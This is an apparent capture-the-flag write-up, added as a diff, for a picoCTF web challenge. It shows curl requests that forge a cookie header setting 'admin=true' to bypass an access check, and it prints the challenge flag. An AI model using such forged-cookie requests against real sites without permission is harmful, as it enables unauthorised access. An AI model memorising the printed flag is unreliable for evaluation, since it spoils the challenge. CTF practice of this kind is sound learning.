@@ -1,0 +1,25 @@
+We can use cookie this time to get the flag
+
+If we use curl,this is what we get..
+
+oot@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1# curl "https://jupiter.challenges.picoctf.org/problem/38421/flag"
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>Redirecting...</title>
+<h1>Redirecting...</h1>
+<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1#
+
+
+We can add H as a header with Cookie as time and admin.
+
+curl "https://jupiter.challenges.picoctf.org/problem/38421/flag" -H "Cookie: time=1400; admin=true"
+
+
+ curl "https://jupiter.challenges.picoctf.org/problem/38421/flag" -H "Cookie: time=1400; admin=true" | grep -iE "picoCTF{.*}"
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1340  100  1340    0     0   1031      0  0:00:01  0:00:01 --:--:--  1032
+            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{0p3n_t0_adm1n5_fa4905c1}</code></p>
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/Brainpan1#
+
+
+picoCTF{0p3n_t0_adm1n5_fa4905c1}
